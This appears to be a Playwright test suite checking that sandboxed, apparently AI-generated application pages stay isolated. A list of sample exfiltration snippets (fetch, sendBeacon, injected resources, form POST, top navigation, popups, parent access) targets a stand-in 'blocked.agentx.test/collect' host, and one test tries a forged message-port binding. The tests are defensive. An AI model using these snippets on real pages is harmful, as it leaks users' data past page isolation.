import { expect, test, type Page } from '@playwright/test'
import { createPageController } from '../../../src/web/src/features/applications/ui/page-isolation'
import { sampleValue } from '../../../src/web/src/features/applications/ui/page-preview'
import { readFileSync } from 'node:fs'
const sdkSource=readFileSync(new URL('../../../contracts/sdk/application-page-v1.js',import.meta.url),'utf8')
const pageStyleSource=readFileSync(new URL('../../../contracts/sdk/application-page-v1.css',import.meta.url),'utf8')

const policy = "default-src 'none'; base-uri 'none'; object-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; connect-src 'none'; img-src data: blob:; media-src blob:; font-src 'none'; frame-src blob:; form-action 'none'; worker-src 'none'"
const destination = 'https://blocked.agentx.test/collect?value=synthetic-plan9-data'

for(const secureHeaders of [false,true])test(`Published controller loads on initial document navigation, security headers ${secureHeaders}`,async({page},info)=>{
  const errors:string[]=[]
  page.on('console',message=>{if(message.type()==='error')errors.push(message.text())})
  page.on('pageerror',error=>errors.push(error.message))
  const controller=createPageController('<h1>Published business page</h1>','initial_published_frame',sdkSource.replace('__AGENTX_PAGE_BINDING__',JSON.stringify('initial_published_frame')),pageStyleSource)
  const attribute=controller.replaceAll('&','&amp;').replaceAll('"','&quot;').replaceAll('<','&lt;').replaceAll('>','&gt;')
  await page.route('https://host.agentx.test/published',route=>route.fulfill({status:200,headers:{
    'Content-Type':'text/html',...(secureHeaders?{'Cross-Origin-Opener-Policy':'same-origin','X-Frame-Options':'DENY'}:{})
  },body:`<!doctype html><h1>Trusted host</h1><iframe title="Business controller" sandbox="allow-scripts allow-forms" srcdoc="${attribute}"></iframe>`}))
  try{
    await page.goto('https://host.agentx.test/published')
    await expect(page.frameLocator('iframe').frameLocator('iframe').getByRole('heading',{name:'Published business page'})).toBeVisible()
  }finally{await info.attach('initial-frame-diagnostic',{contentType:'application/json',body:JSON.stringify({secureHeaders,errors,frames:page.frames().map(frame=>frame.url())})})}
})

const attacks = {
  fetch: `fetch(${JSON.stringify(destination)}).catch(() => {}); navigator.sendBeacon(${JSON.stringify(destination)}, 'synthetic');`,
  resources: `document.body.insertAdjacentHTML('beforeend', '<img src="${destination}"><style>body{background-image:url("${destination}")}</style><iframe src="${destination}"></iframe>');`,
  form: `const form=document.createElement('form'); form.action=${JSON.stringify(destination)}; form.method='POST';document.body.append(form);form.submit();`,
  selfNavigation: `location.href=${JSON.stringify(destination)};`,
  topNavigation: `try{top.location.href=${JSON.stringify(destination)}}catch{}`,
  popup: `window.open(${JSON.stringify(destination)}, '_blank');`,
  parentAccess: `try{parent.document.body.dataset.compromised='yes'}catch{}; try{localStorage.setItem('secret','synthetic')}catch{}`,
}

for (const [name, attack] of Object.entries(attacks)) {
  test(`D9-07 browser isolation blocks ${name}`, async ({ page, context }, testInfo) => {
    const escaped = (value: string) => JSON.stringify(value).replaceAll('<', '\\u003c')
    const script = `<script>parent.postMessage({type:'attack-started'},'*');${attack};parent.postMessage({type:'attack-finished'},'*')</script>`
    const generated = `<!doctype html><meta http-equiv="Content-Security-Policy" content="${policy}"><body><h1>Isolated page</h1>${script}`
    const source = `<!doctype html><body><h1>Trusted host</h1><script>
      window.attackStarted=false;window.attackFinished=false;
      addEventListener('message',event=>{if(event.source===document.querySelector('iframe')?.contentWindow){if(event.data.type==='attack-started')window.attackStarted=true;if(event.data.type==='attack-finished')window.attackFinished=true}});
      const frame=document.createElement('iframe');frame.sandbox='allow-scripts allow-forms';
      frame.src=URL.createObjectURL(new Blob([${escaped(generated)}],{type:'text/html'}));document.body.append(frame);
      </script>`
    const escapedRequests: string[] = []
    await context.route('https://blocked.agentx.test/**', async route => {
      escapedRequests.push(route.request().url())
      await route.fulfill({ status: 200, body: 'Synthetic exfiltration receiver' })
    })
    await page.route('https://host.agentx.test/', route => route.fulfill({
      status: 200, headers: { 'Content-Type': 'text/html', 'Content-Security-Policy': policy }, body: source,
    }))
    await page.goto('https://host.agentx.test/')
    await expect.poll(() => page.evaluate(() => (window as Window & {attackStarted?: boolean}).attackStarted)).toBe(true)
    // Give asynchronous resource requests and frame navigation an opportunity to reach the receiver.
    await page.waitForTimeout(250)
    expect(escapedRequests).toEqual([])
    expect(context.pages()).toHaveLength(1)
    await expect(page.locator('body')).not.toHaveAttribute('data-compromised', 'yes')
    expect(page.url()).toBe('https://host.agentx.test/')
    if (name === 'selfNavigation' || name === 'form') expect(page.frames()[1]?.url()).toBe('chrome-error://chromewebdata/')
    else expect(page.frames()[1]?.url()).toMatch(/^blob:/)
    await page.screenshot({ path: testInfo.outputPath(`${name}.png`) })
    await testInfo.attach('isolation-result', { contentType: 'application/json', body: JSON.stringify({ name, escapedRequests, parentUrl: page.url(), frameUrl: page.frames()[1]?.url(), policy }) })
  })
}

test('D9-07 trusted controller enforces the same boundary inside the management shell', async ({ page, context }) => {
  const escapedRequests: string[] = []
  await context.route('https://blocked.agentx.test/**', async route => { escapedRequests.push(route.request().url()); await route.fulfill({ body: 'Unexpected external request' }) })
  const controller = createPageController(`<h1>Business page</h1><script>parent.postMessage({type:'agentx.page.ready',bindingId:'plan9_controller_spike'},'*');</script>`, 'plan9_controller_spike')
  await page.setContent('<h1>Management shell</h1><iframe id="controller" sandbox="allow-scripts allow-forms"></iframe>')
  await page.locator('#controller').evaluate((element, source) => { (element as HTMLIFrameElement).srcdoc = source }, controller)
  await expect(page.frameLocator('#controller').frameLocator('iframe').getByRole('heading', { name: 'Business page' })).toBeVisible()
  await page.frameLocator('#controller').frameLocator('iframe').locator('body').evaluate((body, target) => {
    try { body.ownerDocument.defaultView!.location.href = target } catch { /* sandbox navigation may be denied immediately */ }
  }, destination)
  await page.waitForTimeout(250)
  expect(escapedRequests).toEqual([])
  await expect(page.getByRole('heading', { name: 'Management shell' })).toBeVisible()
})

test('P9 page SDK executes an isolated synthetic form and returns inspection through its private port', async ({page})=>{
  const binding='plan9_sdk_browser_fixture'
  const html=`<h1>SDK fixture</h1><form id="form"><label for="customer">Customer</label><input id="customer" required data-field-path="/customer"><button data-action="invoke">Submit</button></form><output id="result"></output><script>
    document.querySelector('form').onsubmit=async event=>{event.preventDefault();try{const [task,duplicate]=await Promise.all([agentx.invoke({customer:document.querySelector('input').value}),agentx.invoke({customer:document.querySelector('input').value})]);if(task.state!==duplicate.state)throw new Error('Duplicate submission mismatch');document.querySelector('output').textContent=task.state}catch(error){document.querySelector('output').textContent=error.message}};
    window.exposedCapabilities=Object.keys(agentx);window.tokenVisible=Boolean(agentx.token||agentx.apiKey||agentx.request);
  </script>`
  const source=createPageController(html,binding,sdkSource.replace('__AGENTX_PAGE_BINDING__',JSON.stringify(binding)))
  await page.setContent('<h1>Trusted host</h1><iframe id="controller" sandbox="allow-scripts allow-forms"></iframe>')
  await page.evaluate(({source,binding})=>{
    const host=window as Window&{sdkCalls?:unknown[];inspection?:unknown};host.sdkCalls=[]
    const frame=document.querySelector<HTMLIFrameElement>('#controller')!
    addEventListener('message',event=>{
      if(event.source!==frame.contentWindow||event.data.type!=='agentx.ui.ready'||event.data.bindingId!==binding)return
      const channel=new MessageChannel()
      channel.port1.onmessage=event=>{
        const message=event.data
        if(message.type==='request'){host.sdkCalls!.push({method:message.method,args:message.args});channel.port1.postMessage({type:'response',id:message.id,result:{state:'completed'}})}
        if(message.type==='inspection')host.inspection=message.report
      }
      frame.contentWindow!.postMessage({type:'agentx.ui.bind',bindingId:binding},'*',[channel.port2])
      channel.port1.postMessage({type:'inspect',id:'synthetic-form',input:{customer:'Unseen fixture input'},submit:true})
    })
    frame.srcdoc=source
  },{source,binding})
  const inner=page.frameLocator('#controller').frameLocator('iframe')
  await expect(inner.locator('output')).toHaveText('completed')
  await expect.poll(()=>page.evaluate(()=>(window as Window&{inspection?:{errors:unknown[]}}).inspection?.errors)).toEqual([])
  const result=await inner.locator('body').evaluate(element=>{
    const target=element.ownerDocument.defaultView as Window&{exposedCapabilities?:string[];tokenVisible?:boolean}
    return {capabilities:target.exposedCapabilities,tokenVisible:target.tokenVisible}
  })
  expect(result.tokenVisible).toBe(false)
  expect(result.capabilities).toContain('submitTaskInput')
  expect(result.capabilities).not.toContain('approve')
  expect(await page.evaluate(()=>(window as Window&{sdkCalls?:unknown[]}).sdkCalls)).toEqual([{method:'invoke',args:{input:{customer:'Unseen fixture input'}}}])
})

test('Shared page styles keep long result values inside their desktop grid cells',async({page},info)=>{
  const hash='37778a41087d6cd64f32f43c27d62fe1557b288bf019ced74b84aad73ce5d4227'
  await page.setContent(`<style>${pageStyleSource}</style><style>.results{display:grid;grid-template-columns:repeat(2,minmax(200px,1fr));gap:10px;width:450px}.value b{display:block}</style><section class="results"><div class="value"><b>SHA-256</b><span>${hash}</span></div><div class="value"><b>Summary</b><span>SHA256=${hash}</span></div></section>`)
  const metrics=await page.locator('.value').evaluateAll(elements=>elements.map(element=>{
    const bounds=element.getBoundingClientRect(),range=document.createRange()
    range.selectNodeContents(element.querySelector('span')!)
    const text=[...range.getClientRects()]
    return {left:bounds.left,right:bounds.right,textLeft:Math.min(...text.map(rect=>rect.left)),textRight:Math.max(...text.map(rect=>rect.right)),lines:text.length}
  }))
  for(const value of metrics){
    expect(value.textLeft).toBeGreaterThanOrEqual(value.left-0.5)
    expect(value.textRight).toBeLessThanOrEqual(value.right+0.5)
    expect(value.lines).toBeGreaterThan(1)
  }
  await page.screenshot({path:info.outputPath('long-result-values.png')})
  await info.attach('long-result-layout',{contentType:'application/json',body:JSON.stringify({synthetic:true,formalRequests:0,metrics})})
})

async function inspectFixture(page:Page,html:string,input:unknown){
  const binding='plan9_inspection_fixture'
  const source=createPageController(html,binding,sdkSource.replace('__AGENTX_PAGE_BINDING__',JSON.stringify(binding)))
  await page.setContent('<iframe id="controller" sandbox="allow-scripts allow-forms"></iframe>')
  await page.evaluate(({source,binding,input})=>{
    const host=window as Window&{inspection?:{errors:Array<{code:string}>}}
    const frame=document.querySelector<HTMLIFrameElement>('#controller')!
    addEventListener('message',event=>{
      if(event.source!==frame.contentWindow||event.data?.type!=='agentx.ui.ready'||event.data.bindingId!==binding)return
      const channel=new MessageChannel()
      channel.port1.onmessage=event=>{
        const message=event.data
        if(message.type==='request'){
          const result=message.method==='getContext'?{mode:'preview',taskId:null,contract:{}}:message.method==='listMyTasks'?{items:[],next:null}:{taskId:'7fb84f7a-954d-43bf-9961-2e7f184b3102',state:'accepted',allowedActions:{canCancel:true,inputWaitIds:[],downloadableArtifactIds:[]},pendingInputs:[],pendingApprovals:[],files:[],messages:[],outputs:null}
          channel.port1.postMessage({type:'response',id:message.id,result})
        }
        if(message.type==='inspection')host.inspection=message.report
      }
      frame.contentWindow!.postMessage({type:'agentx.ui.bind',bindingId:binding},'*',[channel.port2])
      channel.port1.postMessage({type:'inspect',id:'fixture-form',input,submit:true})
    });frame.srcdoc=source
  },{source,binding,input})
  await expect.poll(()=>page.evaluate(()=>(window as Window&{inspection?:unknown}).inspection!==undefined)).toBe(true)
  return page.evaluate(()=>(window as Window&{inspection?:{errors:Array<{code:string}>}}).inspection!.errors.map(error=>error.code))
}

test('A caught page rendering error remains visible in the preview diagnostic',async({page},info)=>{
  const recorded:{html:string;inputSchema:unknown;htmlHash:string}|undefined=process.env.AGENTX_E2E_CAUGHT_PREVIEW_FIXTURE?JSON.parse(readFileSync(process.env.AGENTX_E2E_CAUGHT_PREVIEW_FIXTURE,'utf8')):undefined
  const html=recorded?.html??`<form onsubmit="event.preventDefault();agentx.invoke({customer:document.querySelector('input').value}).then(task=>task.allowedActions.indexOf('canCancel')).catch(error=>document.querySelector('p').textContent=error.message)"><label>Customer<input data-field-path="/customer"></label><button data-action="invoke">Submit</button></form><p></p>`
  await inspectFixture(page,html,recorded?sampleValue(recorded.inputSchema):{customer:'Synthetic customer'})
  const diagnostic=await page.evaluate(()=>(window as Window&{inspection?:{visibleText:string}}).inspection!.visibleText)
  expect(diagnostic).toContain('indexOf is not a function')
  expect(diagnostic.length).toBeLessThanOrEqual(8000)
  await info.attach('caught-error-diagnostic',{contentType:'application/json',body:JSON.stringify({synthetic:true,formalRequests:0,diagnostic,usesRecordedAiHtml:Boolean(recorded),originalHtmlHash:recorded?.htmlHash})})
})

test('A synchronous click error is reported by the first preview inspection',async({page})=>{
  const html='<button data-action="invoke" onclick="throw new Error(\'Synthetic click rendering failed\')">Submit</button>'
  expect(await inspectFixture(page,html,{})).toContain('PAGE_SCRIPT_ERROR')
})

for(const step of ['1','any'])test(`Native number control step=${step} is checked with a valid fractional schema sample`,async({page},info)=>{
  const value=sampleValue({type:'number',minimum:0,maximum:50}) as number
  expect(Number.isInteger(value)).toBe(false)
  const recorded: {html:string;inputSchema:unknown;htmlHash:string}|undefined=step==='1'&&process.env.AGENTX_E2E_NUMERIC_PREVIEW_FIXTURE?JSON.parse(readFileSync(process.env.AGENTX_E2E_NUMERIC_PREVIEW_FIXTURE,'utf8')):undefined
  const html=recorded?.html??`<form onsubmit="event.preventDefault()"><label>Discount<input type="number" min="0" max="50" step="${step}" data-field-path="/discount"></label><button data-action="invoke">Submit</button></form>`
  const codes=await inspectFixture(page,html,recorded?sampleValue(recorded.inputSchema):{discount:value})
  if(step==='1')expect(codes).toContain('PAGE_FIELD_CONSTRAINT_MISMATCH')
  else expect(codes).toEqual([])
  await info.attach('native-constraint-proof',{contentType:'application/json',body:JSON.stringify({step,synthetic:true,formalRequests:0,codes,usesRecordedAiHtml:Boolean(recorded),originalHtmlHash:recorded?.htmlHash})})
})

for(const correct of [false,true])test(`Page inspection ${correct?'accepts valid':'rejects missing'} second-row fields and row actions`,async({page})=>{
  const row=`<label>Name<input data-field-path="${correct?'/items/1/name':''}"></label><button type="button" data-action="remove-item" data-field-path="${correct?'/items/1':'/items'}">Remove</button>`
  const html=`<form><label>Name<input data-field-path="/items/0/name"></label><button type="button" data-action="remove-item" data-field-path="/items/0">Remove</button><div id="rows"></div><button id="add" type="button" data-action="add-item" data-field-path="/items">Add</button><button type="button" data-action="invoke" onclick="agentx.invoke({})">Submit</button></form><script>document.getElementById('add').onclick=()=>{document.getElementById('rows').innerHTML=${JSON.stringify(row)}};</script>`
  const codes=await inspectFixture(page,html,{items:[{name:'First synthetic row'},{name:'Second synthetic row'}]})
  if(correct)expect(codes).toEqual([])
  else{expect(codes).toContain('PAGE_BUSINESS_FIELD_MISSING');expect(codes).toContain('PAGE_ARRAY_REMOVE_MISSING')}
})

test('Page inspection fills Artifact controls without asking for internal file metadata',async({page})=>{
  const html='<label>Document<input type="file" data-field-path="/document"></label><label>Comparisons<input type="file" multiple data-field-path="/documents"></label><button type="button" data-action="invoke" onclick="agentx.invoke({})">Submit</button>'
  const artifact={artifactId:'preview-reference',sha256:'0'.repeat(64),sizeBytes:1,contentType:'text/plain'}
  expect(await inspectFixture(page,html,{document:artifact,documents:[artifact,artifact]})).toEqual([])
  const inner=page.frameLocator('#controller').frameLocator('iframe')
  expect(await inner.locator('[data-field-path="/document"]').evaluate(element=>(element as HTMLInputElement).files?.length)).toBe(1)
  expect(await inner.locator('[data-field-path="/documents"]').evaluate(element=>(element as HTMLInputElement).files?.length)).toBe(2)
})

test('A forged null-origin binding cannot capture the page private SDK port',async({page})=>{
  const binding='plan9_forged_binding_fixture'
  const source=createPageController('<h1>Private business page</h1>',binding,sdkSource.replace('__AGENTX_PAGE_BINDING__',JSON.stringify(binding)))
  await page.setContent('<iframe id="controller" sandbox="allow-scripts allow-forms"></iframe>')
  await page.evaluate(({source,binding})=>{
    const frame=document.querySelector<HTMLIFrameElement>('#controller')!
    const host=window as Window&{pageReady?:boolean;connectOwnPage?:()=>void}
    addEventListener('message',event=>{
      if(event.source!==frame.contentWindow||event.data?.type!=='agentx.ui.ready'||event.data.bindingId!==binding)return
      host.pageReady=true
      host.connectOwnPage=()=>{
        const channel=new MessageChannel()
        channel.port1.onmessage=event=>{if(event.data.type==='request')channel.port1.postMessage({type:'response',id:event.data.id,result:{source:'authorized-host'}})}
        frame.contentWindow!.postMessage({type:'agentx.ui.bind',bindingId:binding},'*',[channel.port2])
      }
    });frame.srcdoc=source
  },{source,binding})
  await expect.poll(()=>page.evaluate(()=>(window as Window&{pageReady?:boolean}).pageReady)).toBe(true)
  const inner=page.frames().find(frame=>frame.name()==='agentx-application-page')!
  await inner.evaluate(binding=>{
    const current=window as Window&{forgedMessages?:number;contextSource?:string;agentx?:{getContext:()=>Promise<{source:string}>}}
    current.forgedMessages=0
    const forged=new MessageChannel()
    forged.port1.onmessage=()=>{current.forgedMessages!+=1}
    window.postMessage({type:'agentx.page.bind',bindingId:binding},'*',[forged.port2])
    void current.agentx!.getContext().then(value=>{current.contextSource=value.source})
  },binding)
  await page.waitForTimeout(150)
  expect(await inner.evaluate(()=>(window as Window&{forgedMessages?:number}).forgedMessages)).toBe(0)
  await page.evaluate(()=>(window as Window&{connectOwnPage?:()=>void}).connectOwnPage!())
  await expect.poll(()=>inner.evaluate(()=>(window as Window&{contextSource?:string}).contextSource)).toBe('authorized-host')
  expect(await inner.evaluate(()=>(window as Window&{forgedMessages?:number}).forgedMessages)).toBe(0)
})
